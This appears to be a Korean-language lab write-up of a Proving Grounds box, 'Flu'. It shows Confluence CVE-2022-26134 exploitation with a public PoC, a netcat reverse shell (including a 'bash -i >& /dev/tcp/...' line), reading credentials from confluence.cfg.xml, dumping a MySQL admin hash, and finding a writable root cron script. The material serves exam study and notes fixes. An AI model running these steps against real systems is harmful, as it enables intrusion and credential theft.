 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
AppFusions Doxygen for Atlassian Confluence 1.3.2 - Cross-Site Scri | java/webapps/40817.txt
Atlassian Confluence 7.12.2 - Pre-Authorization Arbitrary File Read | java/webapps/50377.txt
Atlassian Confluence < 8.5.3 - Remote Code Execution                | multiple/webapps/51904.py
Atlassian JIRA 3.7.3 - BrowseProject.JSPA Cross-Site Scripting      | jsp/webapps/29576.txt
Atlassian Tempo 6.4.3 / JIRA 5.0.0 / Gliffy 3.7.0 - XML Parsing Den | jsp/dos/37218.txt
-------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

![[Pasted image 20260714141054.png]]

⚠️ 목록의 `Atlassian Confluence < 8.5.3 - Remote Code Execution`(EDB 51904)은 **막다른 길임.** 제목만 보면 7.13.6 이 `< 8.5.3` 에 들어가나, 파일 헤더의 실제 영향 범위는 `8.0.x ~ 8.5.0-8.5.3` 이고 CVE 도 CVE-2023-22527 로 다른 것임. **제목은 색인이지 명세가 아님** — 자세한 것은 [[_PLAYBOOK#A-13. 익스플로잇을 던지기 전에 버전과 CVE 표기를 검증한다]].

CVE 번호를 손에 쥐었으므로 GitHub 의 Rapid7 PoC 를 직접 클론:

```bash
┌──(kali㉿kali)-[~/PG/Flu]
└─$ git clone https://github.com/jbaines-r7/through_the_wire.git
Cloning into 'through_the_wire'...
remote: Enumerating objects: 25, done.
remote: Counting objects: 100% (25/25), done.
remote: Compressing objects: 100% (22/22), done.
Receiving objects: 100% (25/25), 11.17 KiB | 11.17 MiB/s, done.
Resolving deltas: 100% (12/12), done.
remote: Total 25 (delta 12), reused 8 (delta 3), pack-reused 0 (from 0)
```

![[Pasted image 20260714141236.png]]

> [!tip] OSCP 시험 규정 — 이건 허용임
> 공개 PoC 스크립트는 **금지 대상이 아님.** 금지 정의는 *"스스로 취약점을 발견해 자동으로 익스플로잇하는"* 도구임(`sqlmap`·`db_autopwn`·Nessus 계열).
> 특정 CVE 하나를 겨냥한 PoC 는 스스로 아무것도 발견하지 않음 — 버전을 판정하고 고른 것은 사람임.
> Metasploit 은 **금지가 아니라 1대 한정**이고, 이 박스는 msf 를 쓰지 않아 그 한 장을 아꼈음.

#### 파일 읽기로 실행 확인 — 먼저 `/etc/passwd`

리버스셸을 던지기 전에 **덜 시끄러운 프리미티브로 먼저 실행을 증명함.** 셸이 안 붙으면 원인이 「익스플로잇 실패」인지 「아웃바운드 차단」인지 구분이 안 되기 때문임. 파일 읽기가 되면 RCE 는 확정이고 남은 변수는 네트워크뿐임.

```bash
┌──(kali㉿kali)-[~/PG/Flu/through_the_wire]
└─$ python through_the_wire.py --rhost 192.168.103.41 --rport 8090 --lhost 192.168.45.244 --protocol http:// --read-file /etc/passwd
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:24: SyntaxWarning: invalid escape sequence '\ '
  print("  /__   \ |__  _ __ ___  _   _  __ _| |__  ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:25: SyntaxWarning: invalid escape sequence '\/'
  print("    / /\/ '_ \| '__/ _ \| | | |/ _` | '_ \ ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:27: SyntaxWarning: invalid escape sequence '\/'
  print("   \/   |_| |_|_|  \___/ \__,_|\__, |_| |_|")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:30: SyntaxWarning: invalid escape sequence '\ '
  print("  /__   \ |__   ___  / / /\ \ (_)_ __ ___  ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:31: SyntaxWarning: invalid escape sequence '\/'
  print("    / /\/ '_ \ / _ \ \ \/  \/ / | '__/ _ \ ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:32: SyntaxWarning: invalid escape sequence '\ '
  print("   / /  | | | |  __/  \  /\  /| | | |  __/ ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:33: SyntaxWarning: invalid escape sequence '\/'
  print("   \/   |_| |_|\___|   \/  \/ |_|_|  \___| ")

   _____ _                           _
  /__   \ |__  _ __ ___  _   _  __ _| |__
    / /\/ '_ \| '__/ _ \| | | |/ _` | '_ \
   / /  | | | | | | (_) | |_| | (_| | | | |
   \/   |_| |_|_|  \___/ \__,_|\__, |_| |_|
                               |___/
   _____ _            __    __ _
  /__   \ |__   ___  / / /\ \ (_)_ __ ___
    / /\/ '_ \ / _ \ \ \/  \/ / | '__/ _ \
   / /  | | | |  __/  \  /\  /| | | |  __/
   \/   |_| |_|\___|   \/  \/ |_|_|  \___|

                 jbaines-r7
               CVE-2022-26134
      "Spit my soul through the wire"
                     🦞

[+] Forking a netcat listener
[+] Using /usr/bin/nc
[+] Generating a payload to read: /etc/passwd
[+] Sending expoit at http://192.168.103.41:8090/
listening on [any] 1270 ...
connect to [192.168.45.244] from (UNKNOWN) [192.168.103.41] 40720
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:106::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:101:1::/var/cache/pollinate:/bin/false
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
syslog:x:103:109::/nonexistent:/usr/sbin/nologin
uuidd:x:104:110::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:111::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:113::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:108:114:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:109:115:MySQL Server,,,:/nonexistent:/bin/false
confluence:x:1001:1001:Atlassian Confluence:/home/confluence:/bin/sh
```

**`/etc/passwd` 에서 실제로 건진 것**

| 줄 | 의미 |
|---|---|
| `confluence:x:1001:1001:...:/home/confluence:/bin/sh` | UID 1001, 홈이 `/home/confluence`, 셸이 있음 → `local.txt` 를 여기서 찾으면 됨 |
| `lxd:x:999:100::/var/snap/lxd/...` | LXD 설치돼 있음. 셸을 잡으면 `id` 로 내가 `lxd` 그룹인지 확인할 값어치가 있음 |
| `mysql:x:109:115:MySQL Server` | MySQL 존재. Confluence 의 DB 자격증명이 설정 파일에 평문으로 있을 수 있음 |
| 일반 사용자가 `confluence` 뿐 | 횡이동 대상이 없음 → 권한상승은 곧바로 root 를 노려야 함 |

⚠️ `lxd` 그룹은 **가능성이지 사실이 아니었음.** `/etc/passwd` 에 lxd 계정이 있다는 것은 LXD 가 설치됐다는 뜻일 뿐임. 2차 세션의 `id` 가 결론을 냄 — `groups=1001(confluence)`, **`lxd` 그룹이 아님.** 이 후보는 반증됨.
반면 `mysql` 줄에서 나온 추론은 맞았음 — DB 비밀번호가 평문으로 있었음. **다만 그것도 root 로 이어지지는 않았음**(`Privilege Escalation` 절의 막다른 길 구간).

#### 리버스셸

```bash
┌──(kali㉿kali)-[~/PG/Flu/through_the_wire]
└─$ python through_the_wire.py --rhost 192.168.103.41 --rport 8090 --lhost 192.168.45.244 --protocol http:// --reverse-shell
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:24: SyntaxWarning: invalid escape sequence '\ '
  print("  /__   \ |__  _ __ ___  _   _  __ _| |__  ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:25: SyntaxWarning: invalid escape sequence '\/'
  print("    / /\/ '_ \| '__/ _ \| | | |/ _` | '_ \ ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:27: SyntaxWarning: invalid escape sequence '\/'
  print("   \/   |_| |_|_|  \___/ \__,_|\__, |_| |_|")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:30: SyntaxWarning: invalid escape sequence '\ '
  print("  /__   \ |__   ___  / / /\ \ (_)_ __ ___  ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:31: SyntaxWarning: invalid escape sequence '\/'
  print("    / /\/ '_ \ / _ \ \ \/  \/ / | '__/ _ \ ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:32: SyntaxWarning: invalid escape sequence '\ '
  print("   / /  | | | |  __/  \  /\  /| | | |  __/ ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:33: SyntaxWarning: invalid escape sequence '\/'
  print("   \/   |_| |_|\___|   \/  \/ |_|_|  \___| ")

   _____ _                           _
  /__   \ |__  _ __ ___  _   _  __ _| |__
    / /\/ '_ \| '__/ _ \| | | |/ _` | '_ \
   / /  | | | | | | (_) | |_| | (_| | | | |
   \/   |_| |_|_|  \___/ \__,_|\__, |_| |_|
                               |___/
   _____ _            __    __ _
  /__   \ |__   ___  / / /\ \ (_)_ __ ___
    / /\/ '_ \ / _ \ \ \/  \/ / | '__/ _ \
   / /  | | | |  __/  \  /\  /| | | |  __/
   \/   |_| |_|\___|   \/  \/ |_|_|  \___|

                 jbaines-r7
               CVE-2022-26134
      "Spit my soul through the wire"
                     🦞

[+] Forking a netcat listener
[+] Using /usr/bin/nc
[+] Generating a reverse shell payload
[+] Sending expoit at http://192.168.103.41:8090/
listening on [any] 1270 ...
connect to [192.168.45.244] from (UNKNOWN) [192.168.103.41] 46170
bash: cannot set terminal process group (841): Inappropriate ioctl for device
bash: no job control in this shell
confluence@flu:/opt/atlassian/confluence/bin$ whoami
whoami
confluence
confluence@flu:/opt/atlassian/confluence/bin$
confluence@flu:/opt/atlassian/confluence$ cd /home/confluence
cd /home/confluence
confluence@flu:/home/confluence$ ls
ls
local.txt
confluence@flu:/home/confluence$ cat local.txt
cat local.txt
2d0c7239ce98c1add6986385f076c26e
confluence@flu:/home/confluence$
```

![[Pasted image 20260714142017.png]]

> [!note] 출력에서 읽을 것
> - `cannot set terminal process group` / `no job control` — **정상임.** TTY 없이 붙은 셸의 표준 증상. `Ctrl-C` 가 셸을 죽이고 `su`·`ssh`·`sudo` 가 거부될 수 있으므로 TTY 업그레이드가 필요함:
>   `python3 -c 'import pty;pty.spawn("/bin/bash")'` → `Ctrl-Z` → `stty raw -echo; fg` → `export TERM=xterm`
> - 명령이 두 번씩 보이는 것(`whoami` / `whoami`) — 로컬 에코. 역시 TTY 부재의 증상
> - 시작 디렉터리가 `/opt/atlassian/confluence/bin` — **Confluence 프로세스의 CWD 를 그대로 물려받았다**는 증거. RCE 가 서비스 프로세스 안에서 일어났음을 확인해 줌
> - 프롬프트가 `confluence@flu` — **root 가 아님.** 익스플로잇이 주는 권한은 곧 그 서비스의 실행 계정임

**Local.txt value:**
`2d0c7239ce98c1add6986385f076c26e` — 1차 세션(2026-07-14) 값. 제출 완료.

⚠️ 2차 세션(2026-08-20)에서 박스를 다시 켜면서 값이 `52791694c2a6ccde2db0f566f81d084f` 로 재생성됨. 그 값은 root 획득 후 `Post-Exploitation` 의 한 화면 증거에서 `proof.txt` 와 함께 읽었음. **PG 는 리버트할 때마다 플래그를 새로 만들므로 적어 두고 나중에 제출하려는 계획은 리버트 한 번에 무효가 됨.**

> [!danger] 플래그는 대화형 셸에서 읽었음 — 이것이 시험 요건임
> OSCP 는 **웹셸로 얻은 플래그를 0점 처리함.** 규정 원문: *"this includes any type of web-based shell"*.
> 이 박스는 `nc` 리버스셸(대화형)에서 `cat local.txt` 했으므로 요건을 만족함.
> 다만 **증거 스크린샷 형식은 미흡했음** — 시험이라면 `whoami; hostname; ip a; cat local.txt` 를 한 화면에 담아야 함. 위 스크린샷에는 `ip a` 가 없음. [[Butch]] 참조.

### Privilege Escalation – root cron 이 도는 쓰기 가능 스크립트 → SUID bash

**Vulnerability Explanation:** root 개인 crontab 이 `*/1 * * * *` 로 실행하는 `/opt/log-backup.sh` 가 저권한 서비스 계정 소유임.
- 파일 모드가 `-rwxr-xr-x confluence:confluence` — `/opt` 디렉터리 자체는 root 소유지만 그 안의 파일 하나가 `confluence` 소유라 append 가 가능
- 스크립트가 `BACKUP_DIR="/root/backup"` 에 쓴다는 사실 자체가 실행 주체가 root 라는 증거 — `/root` 는 `drwx------ root root`
- 취약점 부류 = **privileged cron 이 실행하는 쓰기 가능 스크립트.** `sudo -l`·SUID·SGID·capabilities 는 전부 배포판 기본이라 실효 경로가 이것 하나뿐이었음

**Vulnerability Fix:**
- **root 가 실행하는 것은 root 만 쓸 수 있어야 함** — `/opt/log-backup.sh` 를 `root:root 0755` 로 두면 이 경로는 존재하지 않음
- 스크립트 내부 변수에 따옴표가 전혀 없음(`cp -r $LOG_DIR $BACKUP_DIR/...`). 이 박스는 경로에 공백이 없어 무해했으나 로그 파일명을 공격자가 정할 수 있으면 별개의 주입면이 됨
- `sudo -l` 을 비밀번호 뒤에 둔 것은 잘 한 설정임 — 서비스 계정에 `NOPASSWD` 를 줬으면 여기서 바로 끝났음
- DB 비밀번호가 `confluence.cfg.xml` 에 평문인 것은 Atlassian 설계상 불가피하나, **그 비밀번호를 OS 계정과 공유하지 않는 것**이 최소 방어임. 이 박스는 그 점은 지켰음

**Severity:** Critical — 서비스 계정에서 즉시 root

**Steps to reproduce the attack:**
1. 반사 열거 5종(`id`·`sudo -l`·SUID·`getcap`·크론) — 전부 배포판 기본
2. `find / -writable` 에 제외 경로를 붙여 실행 → `/opt/log-backup.sh` 한 줄
3. `ls -la`·`cat` 으로 소유자와 `BACKUP_DIR="/root/backup"` 확인
4. 원본을 `/tmp/.lb.orig` 로 백업한 뒤 SUID bash 생성 한 줄을 append
5. 폴링 루프로 대기 → `/tmp/rootbash` 생성 확인
6. `/tmp/rootbash -p` → `setresuid(0,0,0)` → `/root/proof.txt`

2차 세션(2026-08-20)에서 같은 익스플로잇으로 셸을 다시 잡고 처음부터 열거했음. 아래는 전부 `~/PG/Flu/privesc_session.log` 에서 나온 실측임.

#### 반사 열거 — 표준 5종을 한 줄로 묶어 한 번에

```bash
confluence@flu:/opt/atlassian/confluence/bin$ id; echo ===; uname -a; cat /etc/os-release | head -3; echo ===; sudo -n -l 2>&1; echo ===; ls -la /home /root 2>&1; echo ===; getcap -r / 2>/dev/null; cat /etc/crontab; ls -la /etc/cron.d/ /etc/cron.hourly/ 2>&1; crontab -l 2>&1
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
===
Linux flu 6.2.0-39-generic #40-Ubuntu SMP PREEMPT_DYNAMIC Tue Nov 14 14:18:00 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
PRETTY_NAME="Ubuntu 23.04"
NAME="Ubuntu"
VERSION_ID="23.04"
===
sudo: a password is required
===
/home:
total 12
drwxr-xr-x  3 root       root       4096 Dec 12  2023 .
drwxr-xr-x 19 root       root       4096 Dec 12  2023 ..
drwxr-xr-x  4 confluence confluence 4096 Aug  2  2024 confluence
ls: cannot open directory '/root': Permission denied
===
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
/snap/core22/607/usr/bin/ping cap_net_raw=ep
...
no crontab for confluence
```
— 출처: `~/PG/Flu/privesc_session.log`

`...` 로 자른 구간은 `/etc/crontab`·`/etc/cron.d/`·`/etc/cron.hourly/` 목록임 — 셋 다 배포판 기본값(`e2scrub_all`·`.placeholder`·`run-parts` 네 줄)이라 실마리가 없었음. 전문은 출처 파일에 있음.

**이 한 화면에서 후보가 넷 죽었음.**

| 관측 | 죽은 후보 |
|---|---|
| `groups=1001(confluence)` — 그룹이 자기 자신뿐 | `/etc/passwd` 에서 가능성으로 짚어 두었던 `lxd` 그룹 경로가 반증됨. `docker`·`disk`·`adm`·`sudo` 도 전부 없음 |
| `sudo: a password is required` | `sudo -l` 열거조차 못 함. `NOPASSWD` 항목이 하나라도 있으면 비밀번호 없이 나열되므로 이 문구는 「NOPASSWD 항목이 없다」와 같음 |
| `getcap` — `ping`·`mtr-packet`·`gst-ptp-helper` | 전부 배포판 기본값. `cap_setuid`·`cap_dac_read_search`·`cap_sys_admin` 같은 쓸 만한 것이 없음 |
| `no crontab for confluence` + `/etc/cron*` 기본값 | 크론 경로가 **여기서는** 죽음. ⚠️ 이 판정이 나중에 뒤집힘 — 아래 「크론 열거가 「아무것도 없음」이었는데 크론이 있었다」 |

> [!note] `sudo -n -l` 의 `-n` 은 붙이는 게 나음
> `-n`(non-interactive)이 없으면 `sudo -l` 이 **비밀번호 프롬프트에서 멈춤.** TTY 없는 리버스셸에서는 그대로 셸이 먹통이 될 수 있음.
> `-n` 을 주면 프롬프트 대신 `sudo: a password is required` 한 줄을 뱉고 즉시 돌아옴. 판정에 필요한 정보는 똑같음.

`uname` 이 준 것도 중요함 — **Ubuntu 23.04 / kernel 6.2.0-39-generic.** 1차 세션 노트가 SSH 배너를 보고 「22.04 계열」로 추정했는데 **틀렸음.** nmap 의 `Linux 5.0 - 5.14` 추정도 실제 6.2 와 어긋남.

배너에 답이 이미 있었는데 못 읽은 것임. Launchpad 에 질의해 확인:

```bash
ssh kali@10.44.44.128 'for s in jammy lunar; do echo "== $s"; curl -s "https://api.launchpad.net/1.0/ubuntu/+archive/primary?ws.op=getPublishedSources&source_name=openssh&exact_match=true&distro_series=https://api.launchpad.net/1.0/ubuntu/$s&status=Published" | python3 -c "import sys,json; d=json.load(sys.stdin); [print(e[\"source_package_version\"], e[\"pocket\"]) for e in d[\"entries\"][:6]]"; done'
== jammy
1:8.9p1-3ubuntu0.16 Updates
1:8.9p1-3ubuntu0.16 Security
1:8.9p1-3 Release
== lunar
1:9.0p1-1ubuntu8.7 Updates
1:9.0p1-1ubuntu8.7 Security
1:9.0p1-1ubuntu8 Release
```

**22.04(jammy)는 `8.9p1-3ubuntu0.x`, 23.04(lunar)가 `9.0p1-1ubuntu8.x`.** 타겟 배너 `9.0p1 Ubuntu 1ubuntu8.5` 는 lunar 계열과 **패키지 리비전까지 정확히 맞음.** 배너만으로도 23.04 를 특정할 수 있었는데 「9.x 니까 요즘 LTS 겠지」로 건너뛴 것임.

> [!tip] 커널 익스플로잇을 고려한다면 이 오차가 비쌈
> 5.x 로 알고 5.x 용 PoC 를 고르면 그냥 실패함. **셸을 잡은 뒤에는 추정을 버리고 `uname -a` 로 확정할 것.** 1초짜리 명령임.
> 여기서는 어차피 6.2.0-39(2023-11)가 당시 최신에 가까워 커널 경로를 팔 이유가 없었음. Ubuntu 23.04 + 6.2 를 보면 GameOver(lay)(CVE-2023-2640 / CVE-2023-32629)가 먼저 떠오르나 그 패치는 6.2.0-26 에 들어갔으므로 **-39 는 이미 지나 있음.** `[가정]` — 실제로 시도해 보지는 않았음.

#### SUID·SGID·리스닝 포트 — 전부 공백

```bash
confluence@flu:/opt/atlassian/confluence/bin$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/libexec/polkit-agent-helper-1
...
```
— 출처: `~/PG/Flu/privesc_session.log`

`...` 로 자른 12줄은 전부 `/snap/core22/607/...` 아래의 같은 바이너리 사본임(스냅 코어 이미지). 원문에는 그대로 있음.

**한 줄도 비표준이 없음.** Ubuntu 를 새로 깔면 나오는 목록 그대로임. `pkexec`(CVE-2021-4034)도 없음. 같은 명령의 `-perm -2000`(SGID) 결과도 `utempter`·`pam_extrausers_chkpwd`·`unix_chkpwd`·`ssh-agent`·`wall`·`expiry`·`write`·`crontab`·`chage` 로 전부 배포판 기본이었음.

리스닝 포트를 보면 8091 의 정체가 드러남:

```bash
confluence@flu:/opt/atlassian/confluence/bin$ ss -lntup
Netid State  Recv-Q Send-Q      Local Address:Port  Peer Address:Port Process
udp   UNCONN 0      0                 0.0.0.0:46761      0.0.0.0:*
udp   UNCONN 0      0              127.0.0.54:53         0.0.0.0:*
udp   UNCONN 0      0           127.0.0.53%lo:53         0.0.0.0:*
tcp   LISTEN 0      70              127.0.0.1:33060      0.0.0.0:*
tcp   LISTEN 0      151             127.0.0.1:3306       0.0.0.0:*
tcp   LISTEN 0      4096           127.0.0.54:53         0.0.0.0:*
tcp   LISTEN 0      4096        127.0.0.53%lo:53         0.0.0.0:*
tcp   LISTEN 0      10                      *:8090             *:*   users:(("java",pid=1123,fd=44))
tcp   LISTEN 0      1024                    *:8091             *:*   users:(("java",pid=1420,fd=21))
tcp   LISTEN 0      4096                    *:22               *:*
tcp   LISTEN 0      1      [::ffff:127.0.0.1]:8000             *:*   users:(("java",pid=1123,fd=77))
```
— 출처: `~/PG/Flu/privesc_session.log`

```bash
confluence@flu:/opt/atlassian/confluence/bin$ ps -eo user,pid,args | grep -v "\[" | tail -40
...
conflue+    1123 /opt/atlassian/confluence/jre//bin/java ... org.apache.catalina.startup.Bootstrap start
conflue+    1420 /opt/atlassian/confluence/jre/bin/java -classpath /opt/atlassian/confluence/temp/4.0.0-master-3b3337da.jar:/opt/atlassian/confluence/confluence/WEB-INF/lib/mysql-connector-java-8.2.0.jar -Xss2048k -Xmx2g synchrony.core sql
```
— 출처: `~/PG/Flu/privesc_session.log`

> [!note] 8091 = Synchrony — 1차 세션의 `[가정]` 이 해소됨
> 1차 세션은 8091(`Server: Aleph/0.4.6`)을 「Confluence 와 무관한 별개의 Clojure 서비스」로 적고 `[가정]` 을 달아 뒀음. **절반만 맞았음.**
> `synchrony.core` 는 Confluence 의 **협업 편집(동시 편집) 백엔드**임. Confluence 본체와 같은 JRE, 같은 설치 디렉터리, 같은 `confluence` 계정으로 돎. Clojure 로 쓰였기 때문에 HTTP 계층이 Aleph 였던 것임.
> 즉 별개 제품이 아니라 같은 제품의 두 번째 프로세스이고, 실행 계정이 같으니 **권한상승 경로가 아님** — 8091 을 아무리 잘 뚫어도 다시 `confluence` 임.
> **셸을 쥔 뒤 `ss -lntup` 한 줄이면 밖에서 며칠 헤맬 포트의 정체가 1초에 끝남.**

`ps` 출력에는 리버스셸 자신도 그대로 찍혀 있음 — `conflue+ 2171 bash -c bash -i >& /dev/tcp/192.168.45.207/1270 0>&1` · `conflue+ 2173 bash -i`. 프로세스 트리로 「내가 무엇을 통해 들어와 있는가」가 확인됨.

#### DB 자격증명 — 얻었지만 아무 데도 안 열렸다

Confluence 는 DB 비밀번호를 설정 파일에 평문으로 둠.

```bash
confluence@flu:/opt/atlassian/confluence/bin$ grep -iE "password|username|url|driver" /var/atlassian/application-data/confluence/confluence.cfg.xml
    <property name="hibernate.connection.driver_class">com.mysql.jdbc.Driver</property>
    <property name="hibernate.connection.password">HoldingOn12</property>
    <property name="hibernate.connection.url">jdbc:mysql://localhost:3306/confluence</property>
    <property name="hibernate.connection.username">confluence</property>
```
— 출처: `~/PG/Flu/privesc_session.log`

> [!warning] 파일 위치가 예상과 다름
> 처음엔 `/opt/atlassian/confluence/confluence/WEB-INF/classes/confluence.cfg.xml` 일 것으로 짐작했음. **거기에 없음.**
> `find / -name confluence.cfg.xml` 이 준 실제 위치는 두 곳 — `/var/atlassian/application-data/confluence/confluence.cfg.xml` 와 `.../shared-home/confluence.cfg.xml`.
> **Confluence 의 설정은 설치 디렉터리(`/opt/atlassian/confluence`)가 아니라 홈 디렉터리(`/var/atlassian/application-data/confluence`)에 있음.** 경로를 외우지 말고 `find` 를 쓰는 편이 빠름.

DB 에서 Confluence 관리자 해시까지는 나왔음:

```bash
confluence@flu:/opt/atlassian/confluence/bin$ mysql -u confluence -pHoldingOn12 confluence -e "select user_name,credential from cwd_user;"
mysql: [Warning] Using a password on the command line interface can be insecure.
user_name	credential
admin	{PKCS5S2}MCB0MaBA39GjOQb3wG0ioM7w+pPdQXdy5GskVAtS5/Ef0fCnvr8jPMdZ2CDhM0ke
```
— 출처: `~/PG/Flu/privesc_session.log`

여기서 멈췄음. `{PKCS5S2}` 는 Atlassian 의 PBKDF2-HMAC-SHA1(10000 라운드)이고, 깨도 나오는 것은 **Confluence 웹 UI 의 admin 비밀번호**이지 OS 계정이 아님. 이미 OS 셸을 쥔 상태에서 웹 admin 을 얻는 것은 방향 착오임.

⚠️ **`HoldingOn12` 를 OS 쪽에 재사용하는 것은 시도할 값어치가 있었으나 실제로 해보지 않았음** — 아래 `find / -writable` 이 먼저 답을 냈기 때문임. **배제한 것이 아니라 안 해본 것임.**

#### 결정타 — `find / -writable`

여기까지 표준 열거가 전부 공백이었음. 그래서 질문을 바꿈 — **「내가 쓸 수 있는 남의 것」** 을 찾음.

```bash
confluence@flu:/opt/atlassian/confluence/bin$ find / -writable -not -path "/proc/*" -not -path "/sys/*" -not -path "/tmp/*" -not -path "/var/tmp/*" -not -path "/run/*" -not -path "/opt/atlassian/*" -not -path "/var/atlassian/*" -not -path "/home/confluence/*" -not -path "/dev/*" 2>/dev/null | head -60
/usr/lib/systemd/system/hwclock.service
/usr/lib/systemd/system/screen-cleanup.service
...
/var/lock
/var/crash
/var/tmp
/home/confluence
/opt/log-backup.sh
/tmp
...
```
— 출처: `~/PG/Flu/privesc_session.log`

`head -60` 이 걸린 이 실행의 전체 출력은 29줄이었고, `...` 로 자른 뒤쪽 13줄은 전부 `/snap/core22/607/...` 아래의 사본임(`/dev/null`·`/dev/zero`·마스킹된 유닛·`/var/lock`). 같은 명령에 이어 붙였던 `cat /etc/group | tail -25` 도 `lxd:x:105:` 처럼 **멤버 목록이 전부 비어 있어** 그룹 경로를 한 번 더 닫았음.

> [!tip] 제외 경로를 안 주면 이 명령은 쓸모가 없다
> `-not -path` 없이 돌리면 **내 홈·`/tmp`·`/proc` 이 수천 줄**을 채워 진짜 한 줄이 묻힘.
> 최소한 `/proc`·`/sys`·`/tmp`·`/var/tmp`·`/run`·`/dev` 와 내가 소유한 디렉터리(여기서는 `/opt/atlassian`·`/var/atlassian`·`/home/confluence`)를 뺄 것. 그러고 나면 스냅 사본까지 합쳐 29줄이고, 실제로 볼 줄은 10줄대임.
>
> 위 목록의 `/usr/lib/systemd/system/*.service` 들은 **함정임.** 데비안 계열은 쓰지 않는 유닛을 `/dev/null` 로 심볼릭 링크해 마스킹하고, `find -writable` 은 `access(2)` 라 **링크 대상**(`/dev/null`, 0666)의 권한을 봄. 그 파일에 쓰면 `/dev/null` 에 쓰는 것이라 아무 일도 안 일어남.
>
> [가정] 타겟에서 `ls -la` 로 링크 여부를 직접 확인하지는 않았음(관측 없음) — 같은 이름의 유닛이 Kali 에서 마스킹돼 있는 것은 확인했음:
>
> ```bash
> ssh kali@10.44.44.128 "ls -la /usr/lib/systemd/system/hwclock.service /usr/lib/systemd/system/x11-common.service"
> lrwxrwxrwx 1 root root 9 Nov 26  2025 /usr/lib/systemd/system/hwclock.service -> /dev/null
> lrwxrwxrwx 1 root root 9 Nov 26  2025 /usr/lib/systemd/system/x11-common.service -> /dev/null
> ```
>
> 실전 함의는 같음 — **`find -writable` 이 준 줄은 `ls -la` 로 링크인지 먼저 확인할 것.**

`/opt/log-backup.sh` 만 남음.

```bash
confluence@flu:/opt/atlassian/confluence/bin$ ls -la /opt/
total 756692
drwxr-xr-x  3 root       root            4096 Dec 12  2023 .
drwxr-xr-x 19 root       root            4096 Dec 12  2023 ..
drwxr-xr-x  3 root       root            4096 Dec 12  2023 atlassian
-rwxr-xr-x  1 root       root       774829955 Dec 12  2023 atlassian-confluence-7.13.6-x64.bin
-rwxr-xr-x  1 confluence confluence       408 Dec 12  2023 log-backup.sh

confluence@flu:/opt/atlassian/confluence/bin$ cat /opt/log-backup.sh
#!/bin/bash

CONFLUENCE_HOME="/opt/atlassian/confluence/"
LOG_DIR="$CONFLUENCE_HOME/logs"
BACKUP_DIR="/root/backup"
TIMESTAMP=$(date "+%Y%m%d%H%M%S")

# Create a backup of log files
cp -r $LOG_DIR $BACKUP_DIR/log_backup_$TIMESTAMP

tar -czf $BACKUP_DIR/log_backup_$TIMESTAMP.tar.gz $BACKUP_DIR/log_backup_$TIMESTAMP

# Cleanup old backups
find $BACKUP_DIR -name "log_backup_*"  -mmin +5 -exec rm -rf {} \;
```
— 출처: `~/PG/Flu/privesc_session.log`

세 줄이 전부 말해 줌:

1. `-rwxr-xr-x 1 confluence confluence` — **내가 쓸 수 있음.** `/opt` 디렉터리 자체는 root 소유지만 파일 하나의 소유자가 `confluence` 임
2. `BACKUP_DIR="/root/backup"` — `/root` 아래에 씀. `/root` 는 `drwx------ root root` 이므로 이 스크립트는 **root 로 실행될 수밖에 없음**
3. `-mmin +5` — 5분보다 오래된 백업을 지움. **분 단위로 도는 작업**이라는 뜻

